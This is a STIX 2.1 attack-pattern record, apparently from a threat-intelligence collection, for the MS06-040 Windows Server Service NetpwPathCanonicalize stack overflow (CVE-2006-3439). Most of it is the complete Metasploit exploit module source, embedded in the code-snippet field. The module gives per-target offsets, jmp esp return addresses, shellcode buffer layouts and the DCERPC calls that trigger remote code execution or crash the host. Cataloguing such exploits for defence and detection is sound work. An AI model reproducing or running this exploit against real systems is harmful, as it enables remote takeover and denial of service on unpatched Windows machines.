{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d5145fa-99d7-4f36-8a3a-24e933495263",
    "created": "2024-08-14T16:56:05.98259Z",
    "modified": "2024-08-14T16:56:05.982594Z",
    "name": "MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow",
    "description": " This module exploits a stack buffer overflow in the NetApi32 CanonicalizePathName() function using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that other RPC calls could be used to exploit this service. This exploit will result in a denial of service on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt will likely result in a complete reboot on Windows 2000 and the termination of all SMB-related services on Windows XP. The default target for this exploit should succeed on Windows NT 4.0, Windows 2000 SP0-SP4+, Windows XP SP0-SP1 and Windows 2003 SP0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms06_040_netapi.rb",
            "external_id": "ms06_040_netapi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3439"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the NetApi32 CanonicalizePathName() function\n        using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that\n        other RPC calls could be used to exploit this service. This exploit will result in\n        a denial of service on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt\n        will likely result in a complete reboot on Windows 2000 and the termination of all\n        SMB-related services on Windows XP. The default target for this exploit should succeed\n        on Windows NT 4.0, Windows 2000 SP0-SP4+, Windows XP SP0-SP1 and Windows 2003 SP0.\n      },\n      'Author'         =>\n        [\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-3439' ],\n          [ 'OSVDB', '27845' ],\n          [ 'BID', '19409' ],\n          [ 'MSB', 'MS06-040' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # Technically we can use more space than this, but by limiting it\n          # to 370 bytes we can use the same request for all Windows SPs.\n          'Space'    => 370,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'DefaultTarget'  => 0,\n      'Targets'        =>\n        [\n          [ '(wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)', { } ],\n          [ '(wcscpy) Windows NT 4.0 / Windows 2000 SP0-SP4',\n            {\n              'Offset' => 1000,\n              'Ret'    => 0x00020804\n            }\n          ],\n          [ '(wcscpy) Windows XP SP0/SP1',\n            {\n              'Offset' => 612,\n              'Ret'    => 0x00020804\n            }\n          ],\n          [ '(stack)  Windows XP SP1 English',\n            {\n              'OffsetA' => 656,\n              'OffsetB' => 680,\n              'Ret'     => 0x71ab1d54 # jmp esp @ ws2_32.dll\n            }\n          ],\n          [ '(stack)  Windows XP SP1 Italian',\n            {\n              'OffsetA' => 656,\n              'OffsetB' => 680,\n              'Ret'     => 0x71a37bfb # jmp esp @ ws2_32.dll\n            }\n          ],\n          [ '(wcscpy) Windows 2003 SP0',\n            {\n              'Offset' => 612,\n              'Ret'    => 0x00020804\n            }\n          ],\n        ],\n      'Notes'          =>\n        {\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_RESTARTS, CRASH_SERVICE_DOWN ]\n        },\n      'DisclosureDate' => '2006-08-08'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (BROWSER, SRVSVC)\", 'BROWSER']),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def exploit\n\n    connect(versions: [1])\n    smb_login()\n\n    mytarget = target\n    if (not target) or (target.name =~ /Automatic/)\n      case smb_peer_os()\n        when 'Windows 5.0'\n          print_status(\"Detected a Windows 2000 target\")\n          mytarget = targets[1]\n\n        when 'Windows NT 4.0'\n          print_status(\"Detected a Windows NT 4.0 target\")\n          mytarget = targets[1]\n\n        when 'Windows 5.1'\n          begin\n            smb_create(\"\\\\SRVSVC\")\n            print_status(\"Detected a Windows XP SP0/SP1 target\")\n          rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\n            if (e.error_code == 0xc0000022)\n              print_status(\"Windows XP SP2 is not exploitable\")\n              return\n            end\n            print_status(\"Detected a Windows XP target (unknown patch level)\")\n            print_status(\"To exploit this system, \\\"set TARGET 2\\\" and run this exploit again\")\n          end\n          return\n\n        when /Windows Server 2003 (\\d+)$/\n          print_status(\"Detected a Windows 2003 SP0 target, but have not confirmed English language\")\n          print_status(\"To exploit this system, \\\"set TARGET 5\\\" and run this exploit again\")\n          # mytarget = targets[5]\n          return\n\n        when /Windows Server 2003 (\\d+) Service Pack (\\d+)/\n          print_status(\"Windows 2003 SP#{$2} is not exploitable\")\n          return\n\n        when /Samba/\n          print_status(\"Samba is not vulnerable\")\n          return\n\n        else\n          print_status(\"No target detected for #{smb_peer_os()}/#{smb_peer_lm()}...\")\n          return\n      end\n    end\n\n    # Specific fixups for Windows NT\n    case smb_peer_os()\n    when 'Windows NT 4.0'\n      print_status(\"Adjusting the SMB/DCERPC parameters for Windows NT\")\n      datastore['SMB::pipe_write_min_size'] = 2048\n      datastore['SMB::pipe_write_max_size'] = 4096\n    end\n\n    handle = dcerpc_handle(\n      '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',\n      'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"]\n    )\n\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    #\n    #  /* Function 0x1f at 0x767e912c */\n    #  long function_1f (\n    #    [in] [unique] [string] wchar_t * arg_00,\n    #    [in] [string] wchar_t * arg_01,\n    #    [out] [size_is(arg_03)] char * arg_02,\n    #    [in] [range(0, 64000)] long arg_03,\n    #    [in] [string] wchar_t * arg_04,\n    #    [in,out] long * arg_05,\n    #    [in] long arg_06\n    #  );\n    #\n\n    print_status(\"Building the stub data...\")\n    stub = ''\n\n    case mytarget.name\n\n    # This covers NT 4.0 as well\n    when /wcscpy.*Windows 2000/\n\n      code = make_nops(mytarget['Offset'] - payload.encoded.length) + payload.encoded\n\n      path = code + ( [mytarget.ret].pack('V') * 16 ) + \"\\x00\\x00\"\n\n      stub =\n        NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.UnicodeConformantVaryingStringPreBuilt(path) +\n        NDR.long(rand(250)+1) +\n        NDR.UnicodeConformantVaryingStringPreBuilt(\"\\xeb\\x02\\x00\\x00\") +\n        NDR.long(rand(250)+1) +\n        NDR.long(0)\n\n    when /wcscpy.*Windows XP/\n      path =\n        # Payload goes first\n        payload.encoded +\n\n        # Padding\n        rand_text_alphanumeric(mytarget['Offset'] - payload.encoded.length) +\n\n        # Land 6 bytes in to bypass garbage (XP SP0)\n        [ mytarget.ret + 6 ].pack('V') +\n\n        # Padding\n        rand_text_alphanumeric(8) +\n\n        # Address to write our shellcode (XP SP0)\n        [ mytarget.ret ].pack('V') +\n\n        # Padding\n        rand_text_alphanumeric(32) +\n\n        # Jump straight to shellcode (XP SP1)\n        [ mytarget.ret ].pack('V') +\n\n        # Padding\n        rand_text_alphanumeric(8) +\n\n        # Address to write our shellcode (XP SP1)\n        [ mytarget.ret ].pack('V') +\n\n        # Padding\n        rand_text_alphanumeric(32) +\n\n        # Terminate the path\n        \"\\x00\\x00\"\n\n      stub =\n        NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.UnicodeConformantVaryingStringPreBuilt(path) +\n        NDR.long(rand(0xf0)+1) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.long(rand(0xf0)+1) +\n        NDR.long(0)\n\n\n    when /stack/\n      buff = rand_text_alphanumeric(800)\n      buff[0, payload.encoded.length] = payload.encoded\n      buff[ mytarget['OffsetA'], 4 ] = [mytarget.ret].pack('V')\n      buff[ mytarget['OffsetB'], 5 ] = \"\\xe9\" + [ (mytarget['OffsetA'] + 5) * -1 ].pack('V')\n\n      path = \"\\\\\\x00\\\\\\x00\" + buff + \"\\x00\\x00\"\n\n      stub =\n        NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.UnicodeConformantVaryingStringPreBuilt(path) +\n        NDR.long(rand(0xf0)+1) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.long(rand(0xf0)+1) +\n        NDR.long(0)\n\n\n    when /wcscpy.*Windows 2003/\n      path =\n        # Payload goes first\n        payload.encoded +\n\n        # Padding\n        rand_text_alphanumeric(mytarget['Offset'] - payload.encoded.length) +\n\n        # Padding\n        rand_text_alphanumeric(32) +\n\n        # The cookie is constant,\n        # noticed by Nicolas Pouvesle in Misc #28\n        \"\\x4e\\xe6\\x40\\xbb\" +\n\n        # Padding\n        rand_text_alphanumeric(4) +\n\n        # Jump straight to shellcode\n        [ mytarget.ret ].pack('V') +\n\n        # Padding\n        rand_text_alphanumeric(8) +\n\n        # Address to write our shellcode\n        [ mytarget.ret ].pack('V') +\n\n        # Padding\n        rand_text_alphanumeric(40) +\n\n        # Terminate the path\n        \"\\x00\\x00\"\n\n      stub =\n        NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.UnicodeConformantVaryingStringPreBuilt(path) +\n        NDR.long(rand(0xf0)+1) +\n        NDR.UnicodeConformantVaryingString('') +\n        NDR.long(rand(0xf0)+1) +\n        NDR.long(0)\n\n    end\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      dcerpc.call(0x1f, stub, false)\n      dcerpc.call(0x1f, stub, false)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    rescue => e\n      if e.to_s !~ /STATUS_PIPE_DISCONNECTED/\n        raise e\n      end\n    end\n\n    # Cleanup\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-08-08",
    "x_mitre_platforms": [
        "win'"
    ]
}